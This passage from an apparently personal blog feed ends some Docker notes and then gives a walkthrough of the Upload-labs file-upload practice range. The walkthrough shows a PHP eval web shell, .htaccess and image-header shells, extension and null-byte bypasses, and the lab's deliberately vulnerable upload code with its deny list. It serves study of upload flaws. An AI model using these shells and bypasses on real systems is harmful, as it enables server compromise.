的环境下执行的命令。<code>RUN</code>指令会在新创建的镜像上添加新的层面，接下来提交的结果用在Dockerfile的下一条指令中。语法如下：</p><p><code>RUN &lt;command&gt;</code></p><p>简单的说就是可以执行命令行的指令，在镜像开始的时候进行运行</p><p>例：<code>RUN yum install wget</code></p><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>指定容器在运行时监听的端口。</p><p><code>EXPOSE &lt;port&gt;</code></p><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>指定<code>RUN</code>、<code>CMD</code>与<code>ENTRYPOINT</code>命令的工作目录。类似cd，语法如下</p><p><code>WORKDIR /var/www/html</code></p><p>表示建立在网址根目录之下</p><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809085421.png"></p><h3 id="ADD-amp-COPY"><a href="#ADD-amp-COPY" class="headerlink" title="ADD&amp;COPY"></a>ADD&amp;COPY</h3><p>这里把ADD和COPY两个指令放一起，说明它们两个功能很类似。有时候，随便使用哪一个都行，它们的作用都是把本地的文件添加到Docker image里面。两者唯一的区别是，ADD的功能更强大一些，ADD会拷贝文件并且解压文件，COPY只能拷贝文件。</p><p><code>ADD &lt;source&gt; &lt;destination&gt;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809085625.png"></p><p>例如第一个指令的意思就是将hello复制到接下来要build的docker image的根目录（hello为本地文件）</p><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>设置环境变量</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809085855.png"></p><p>这里用一张趣味的图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809090110.png"></p><h2 id="创建简单的apache服务器"><a href="#创建简单的apache服务器" class="headerlink" title="创建简单的apache服务器"></a>创建简单的apache服务器</h2><ul><li><p>首先创建一个文件夹，存放dockerfile和index.html</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809094937.png"></p></li></ul><ul><li><p>编写index.html</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809095345.png"></p><p>很简单的显示页面，完成后保存</p></li><li><p>编写dockerfile</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809095615.png"></p><p>大致意思就是选自apache2-php7的镜像，并将index.html页面复制到目录下，使它显示在根目录，用80端口也就是将他们以网页的形式显示出来</p></li></ul><ul><li><p>进行创建镜像</p><p>命令：<code>docker build -t test .</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809095706.png"></p><ul><li><p>将端口映射出去</p><p>命令：<code>docker run -i -d -p 30002:80 test</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809100906.png"></p></li></ul><ul><li><p>打开网页</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210809101006.png"></p></li></ul><p>​    完成一个简单的apache服务器</p><h2 id="Portainer-安装与配置"><a href="#Portainer-安装与配置" class="headerlink" title="Portainer 安装与配置"></a>Portainer 安装与配置</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><blockquote><p>  Portainer 是一个开源、轻量级Docker管理用户界面，基于Docker API，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。</p></blockquote><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ul><li><p>搜索镜像</p><p><code>docker search portainer/portainer</code></p></li><li><p>拉取镜像</p><p><code>docker pull portainer/portainer</code></p></li><li><p>运行镜像</p><p><code>docker run -d -p 9000:9000 -v /root/portainer:/data -v /var/run/docker.sock:/var/run/docker.sock --name dev-portainer portainer/portainer</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808233647.png"></p><h3 id="本机访问"><a href="#本机访问" class="headerlink" title="本机访问"></a>本机访问</h3><p>访问端口9000即可</p><p>首次登陆设置密码即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808234102.png"></p><p>这里选择local即可，remote是集群，反正也不知道啥意思，用着先</p><p>成功后即可看到本机上的容器情况</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808234302.png"></p><p>那我觉得还是命令行的好用一些，更快捷，图形化更形象</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;Docker学习笔记&lt;/h1&gt;

&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Docker</summary>
      
    
    
    
    <category term="-学习笔记" scheme="https://blog.abinix.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="-Docker" scheme="https://blog.abinix.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Upload-labs</title>
    <link href="https://blog.abinix.top/2021/07/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.abinix.top/2021/07/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-07-30T16:00:19.000Z</published>
    <updated>2022-01-18T17:04:30.917Z</updated>
    
    <content type="html"><![CDATA[ <h1 align = "center">文件上传学习笔记</h1><h2 id="文件上传常用函数"><a href="#文件上传常用函数" class="headerlink" title="文件上传常用函数"></a>文件上传常用函数</h2><ul><li><p>file_exists() 函数检查文件或目录是否存在</p></li><li><p>deldot() 删除文件名末尾的点</p></li><li><p>strtolower( ) 将字符串转化为小写</p></li><li><p>str_ireplace() 替换函数，替换字符串中的一些字符</p><ul><li>通常格式为str_ireplace(“$1”,”$2”,”$3”），意思是将$3中的$1替换为$2</li></ul></li><li><p>unlink() 删除函数</p></li><li><p>trim（）函数移除文字字符的字体或其他预定义的字符（可以理解为去除空格等等）</p></li><li><p>strrchr() 查找字符串在另一个字符串中最后出现的位置，并返回到该位置后的所有字符</p><ul><li>例子：strrchr($x,’.’) 意思是查找 . 在变量x中最后一次出现的位置，假如$x为zhaobin.shuaishuai 那么这个函数的结果为shuaishuai</li></ul></li><li><p>strrpos() 函数查找字符串在另一中最后一次出现的位置（时间大小写）。</p><ul><li>和 strtchr()函数的区别就在于 它不返回到改位置</li></ul></li><li><p>move_uploaded_file() 把上传的文件移动到新的位置</p></li><li><p>getimagesize() 获取图像大小及相关信息</p></li><li><p>in_array() 用于搜索数组中是否存在指定的值，在文件上传中常用于过滤一些后缀名</p></li><li><p>unpack() 函数从二进制字符串对数据进行解包。</p></li><li><p>exif_imagetype() 判断一个图像的类型,读取一个图像的第一个字节并检查其签名</p></li></ul><h2 id="文件上传常见类型"><a href="#文件上传常见类型" class="headerlink" title="文件上传常见类型"></a>文件上传常见类型</h2><p>如下图，即常见类型，我们可以用upload-labs进行练习</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f54ecc934df.jpg"></p><h2 id="搭建upload-labs靶场"><a href="#搭建upload-labs靶场" class="headerlink" title="搭建upload-labs靶场"></a>搭建upload-labs靶场</h2><blockquote><p>docker search upload-labs </p><p>docker pull c0ny1/upload-labs</p><p>docker run -d -p 20001:80 c0ny1/upload-labs </p><p>docker exec -it (容器id) /bin/bash          //交互模式进入容器<br>mkdir upload                               //创建upload文件夹<br>chmod a+w upload                           //赋予读写权限</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/7fd9b3c133ebcaa9.png"></p><h2 id="upload-labs-1-前端js校验"><a href="#upload-labs-1-前端js校验" class="headerlink" title="upload-labs 1(前端js校验)"></a>upload-labs 1(前端js校验)</h2><h3 id="方法1：用burpsuite里的功能，禁用js，"><a href="#方法1：用burpsuite里的功能，禁用js，" class="headerlink" title="方法1：用burpsuite里的功能，禁用js，"></a>方法1：用burpsuite里的功能，禁用js，</h3><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f42d3ea86cd.jpg"></p><h4 id="方法2：通过burp抓包改后缀进行绕过"><a href="#方法2：通过burp抓包改后缀进行绕过" class="headerlink" title="方法2：通过burp抓包改后缀进行绕过"></a>方法2：通过burp抓包改后缀进行绕过</h4><ol><li><p>事先先在txt中写入一句话木马 <code>&lt;?php eval($_POST[shell]);?&gt;</code>，然后把类型改为jpg，即运行上传的类型</p></li><li><p>打开burp，选择好jpg文件后上传，可以看到jpg下其实是隐藏的一句话木马</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/470d6f07ab63a290.png"></p></li><li><p>我们将文件类型改为php，来执行一句话木马，达到提权的效果，如下图已经上传成功了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/5edd8648cac9afd8.png"></p></li><li><p>如图，url中就是我们上传图片的位置了，我们可以用蚁剑来连接</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/12d49b226fe8b896.png"></p></li><li><p>打开蚁剑，填入url和一句话中post的密码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/be7c971180f660f5.png"></p></li><li><p>如图，显示已经连接成功，说明提权成功了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/deaebefad8b44800.png"></p></li></ol><h2 id="upload-labs-2（类型绕过）"><a href="#upload-labs-2（类型绕过）" class="headerlink" title="upload-labs 2（类型绕过）"></a>upload-labs 2（类型绕过）</h2><p>通过源码我们可以发现，这题较上题没有什么太大区别，重点是它<strong>判断了content-type的类型</strong>，</p><p>所以我们可以在抓包时更改类型为<strong>image/jpeg</strong></p><p>如下图，更改类型为image/jpeg即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f431d9105d0.jpg"></p><h2 id="upload-labs-3（黑名单）"><a href="#upload-labs-3（黑名单）" class="headerlink" title="upload-labs 3（黑名单）"></a>upload-labs 3（黑名单）</h2><h4 id="方法1：更换php文件名进行绕过"><a href="#方法1：更换php文件名进行绕过" class="headerlink" title="方法1：更换php文件名进行绕过"></a>方法1：更换php文件名进行绕过</h4><p>我们先看源代码，过滤了<code>.asp,.aspx,.php,.jsp</code>的后缀文件，但是我们知道能执行php代码的文件后缀不止一个，我们还可以用<code>.phtml .phps .php5 .pht</code>等后缀进行执行。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4337c50c9d.jpg"></p><p>解题方法一样，通过抓包改后缀为**.phtml**，然后绕过</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4347c2ad30.jpg"></p><p>同样通过蚁剑连接成功，代表提权成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f432741959c.jpg"></p><h2 id="upload-labs-4（黑名单）"><a href="#upload-labs-4（黑名单）" class="headerlink" title="upload-labs 4（黑名单）"></a>upload-labs 4（黑名单）</h2><h3 id="方法1：改后缀"><a href="#方法1：改后缀" class="headerlink" title="方法1：改后缀"></a>方法1：改后缀</h3><p><strong>Apache解析漏洞</strong>：Apache会将不认识的后缀，如suibianxie.php.xxx.ccc、test.php.iii等<strong>从右向左解析</strong>，不认识就往左移一个，最终移到php时apache认识了就会将该文件当作php文件来解析。<strong>2.4.0-2.4.29</strong>中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>先上传一个带有一句话木马的jpg文件，然后将后缀改为 <strong>php.xxx</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f444563f552.jpg"></p><p>可以看到上传成功，成功执行</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f444081b917.jpg"></p><h3 id="方法2：-htaccess绕过"><a href="#方法2：-htaccess绕过" class="headerlink" title="方法2：.htaccess绕过"></a>方法2：.htaccess绕过</h3><p>先看源码，几乎过滤了所有php代码执行的后缀名，但是还有一个没有过滤，那就是**.htaccess**</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f434d8d74ca.jpg"></p><h4 id="何为htaccess？"><a href="#何为htaccess？" class="headerlink" title="何为htaccess？"></a>何为htaccess？</h4><blockquote><p>.htaccess（超文本访问）是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。</p><p>而在文件上传类型中，.htaccess可以将所有的文件当成php来解析</p></blockquote><p><strong>能执行htaccess的前提条件是：</strong></p><blockquote><p> 1.mod_rewrite模块开启。2.AllowOverride All</p></blockquote><p><strong>本题思路：</strong>我们先上传一个.htaccess的文件，然后再上传一个带有一句话木马的jpg文件，这样.htaccess就会将后来上传的图片转化为php代码执行，达到目的</p><ul><li><p>我们在txt中写入 <code>SetHandler application/x-httpd-php</code> ，</p><p>或者这么写入： （意思就是将”一句话.jpg“解析为php代码执行）</p><p><code>&lt;FilesMatch &quot;一句话.jpg&quot;&gt;</code><br><code>SetHandler application/x-httpd-php</code><br><code>&lt;/FilesMatch&gt;</code></p><p>并将类型改为.htaccess，并上传</p></li><li><p>然后上传带有一句话木马的图片，如下图，显示上传成功，可以直接连蚁剑了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f44750e60c4.jpg"></p></li></ul><h2 id="upload-labs-5（大小写绕过）"><a href="#upload-labs-5（大小写绕过）" class="headerlink" title="upload-labs 5（大小写绕过）"></a>upload-labs 5（大小写绕过）</h2><p>首先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4ccae00cd8.jpg"></p><p>对比前面几关 我们可以看到这题放过了大小写的绕过  </p><p>去掉了 <code> $file_ext = strtolower($file_ext); //转换为小写</code>，所以我们可以通过大小写绕过</p><p>和前面套路一样，先上传一个一句话<strong>，然后在burp中改后缀为.PHP</strong></p><p>因为我的一句话中写的是 phpinfo() ,所以当上传成功时就会显示phpinfo</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4cd48d9eb9.jpg"></p><h2 id="upload-labs-6（空格绕过-win特性）"><a href="#upload-labs-6（空格绕过-win特性）" class="headerlink" title="upload-labs 6（空格绕过,win特性）"></a>upload-labs 6（空格绕过,win特性）</h2><h3 id="方法1：-没有过滤php7，将后缀改为php7即可"><a href="#方法1：-没有过滤php7，将后缀改为php7即可" class="headerlink" title="方法1： 没有过滤php7，将后缀改为php7即可"></a>方法1： 没有过滤php7，将后缀改为php7即可</h3><p>先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d0663e728.jpg"></p><p>我们可以发现这题没有针对空格进行过滤 缺少了 <code>$file_ext = trim($file_ext); *//首尾去空*</code></p><h3 id="方法2：在-php后面加空格进行绕过"><a href="#方法2：在-php后面加空格进行绕过" class="headerlink" title="方法2：在.php后面加空格进行绕过"></a>方法2：在.php后面加空格进行绕过</h3><p>这里我的环境好像出了点问题，没复现成功</p><h2 id="upload-labs-7（点绕过）"><a href="#upload-labs-7（点绕过）" class="headerlink" title="upload-labs 7（点绕过）"></a>upload-labs 7（点绕过）</h2><p>先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d2fd1e7cc.jpg"></p><p>我们发现这题 放过了点号，把语句<code>$file_name = deldot($file_name);*//删除文件名末尾的点*</code>去掉了</p><p>所以我们可以利用windows特性，会<strong>自动去掉后缀名中最后的”.”</strong>，可在后缀名中加”.”绕过：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d3a4a03ae.jpg"></p><p>于是上传成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d3a56926c.jpg"></p><h2 id="upload-labs-8（-DATA绕过）"><a href="#upload-labs-8（-DATA绕过）" class="headerlink" title="upload-labs 8（::$DATA绕过）"></a>upload-labs 8（::$DATA绕过）</h2><p>看源码可以知道没有对**::$DATA**进行过滤 </p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);*//去除字符串::$DATA*</code></p><p>查找资料后可知在php+windows的环境下，会把::$DATA之后的数据当成文件流处理,不会检测后缀名，并且保留前面的文件名</p><p>所以我们在.php后加::$DATA即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d64224c93.jpg"></p><p>上传成功，显示phpinfo</p><h2 id="upload-labs-9（点空格点绕过）"><a href="#upload-labs-9（点空格点绕过）" class="headerlink" title="upload-labs 9（点空格点绕过）"></a>upload-labs 9（点空格点绕过）</h2><blockquote><p>原理：代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过<strong>strrchar</strong>函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="upload-labs-10（双写绕过）"><a href="#upload-labs-10（双写绕过）" class="headerlink" title="upload-labs 10（双写绕过）"></a>upload-labs 10（双写绕过）</h2><p>源码中着重看着一点  <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>理解一下便知 将黑名单里的后缀名<strong>替换为空且只替换一次</strong>，因此可以用双写绕过，大致意思就是当出现黑名单里的后缀时就将它转换为空,pphphp–&gt;php</p><p>所以pphphp和phphpp写法并不一样。</p><blockquote><p>pphphp解析后是 php</p><p>phphpp解析后是 hpp</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f520dcac6e1.jpg"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4eba014ad6.jpg"></p><h2 id="upload-labs-11（00截断）"><a href="#upload-labs-11（00截断）" class="headerlink" title="upload-labs 11（00截断）"></a>upload-labs 11（00截断）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p>理解： /?filename=111.txt 正常解析是txt，而/?filename=111.php%00.txt<br>最后上传后的解析的就是111.php</p><p>$img_path是直接拼接的，所以可以用00截断绕过</p><p>**截断条件：1.php版本小于5.3.4 **</p><p>​      <strong>2.php的magic_quotes_gpc为OFF状态</strong></p><p>所以我们抓包后在save_path里改路径即可，如下图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f525ba927d2.jpg"></p><p>但由于php版本问题，这两个漏洞都无法复现成功</p><h2 id="upload-labs-12（00截断）"><a href="#upload-labs-12（00截断）" class="headerlink" title="upload-labs 12（00截断）"></a>upload-labs 12（00截断）</h2><p>这里的00截断为post请求，所以我们抓包以后在十六进制里改就好啦！</p><p>但由于php版本问题，这两个漏洞都无法复现成功</p><h2 id="upload-labs-13（图片马）"><a href="#upload-labs-13（图片马）" class="headerlink" title="upload-labs 13（图片马）"></a>upload-labs 13（图片马）</h2><p>可以看到代码中只检测文件头的2字节内容，所以我们将文件的头两个字节修改为图片的格式就可以绕过</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f529f47461e.jpg"></p><h3 id="方法1：制作gif马"><a href="#方法1：制作gif马" class="headerlink" title="方法1：制作gif马"></a>方法1：制作gif马</h3><p> 因为只检测前两个字节，所以我们只要在php代码前加入gif的文件头即可，也就是加入 GIF98a</p><p><code>GIF89a &lt;?php phpinfo();?&gt;</code></p><p>然后直接上传即可，但本题需要使用文件包含来执行代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f53119c15d9.jpg"></p><p>打开网站 在url中输入我们上传gif的路径即可 </p><p>使用GET传参 <code>?file=upload/8620210719080601.gif</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f531b223e5b.jpg"></p><p>如下图，可以看到执行成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f532aaa39a1.jpg"></p><h3 id="方法2：制作jpg，png马"><a href="#方法2：制作jpg，png马" class="headerlink" title="方法2：制作jpg，png马"></a>方法2：制作jpg，png马</h3><p>emmm方法也有两种，一种是 <code>copy 22.jpg /b + 1.php /a shell.jpg</code></p><p>而我的方法是在jpg图片的末尾处插入php执行代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f533c8545e7.jpg"></p><p>这样后端会判断这是一张jpg图片，而当我们文件包含时，php代码就被执行了</p><p>如下图 phpinfo的页面已显示出来</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/ea59b470e213e172.png"></p><h2 id="upload-labs-14（图片马）"><a href="#upload-labs-14（图片马）" class="headerlink" title="upload-labs 14（图片马）"></a>upload-labs 14（图片马）</h2><p>这题多了一个函数<strong>getimagesize()</strong></p><p>但是整体好像没什么区别 用13题的做法还是能出来</p><p>pass15也是一样的做法hhhhh，我感觉就是加了个函数验证，做法都一样的</p><h2 id="upload-labs-17（条件竞争）"><a href="#upload-labs-17（条件竞争）" class="headerlink" title="upload-labs 17（条件竞争）"></a>upload-labs 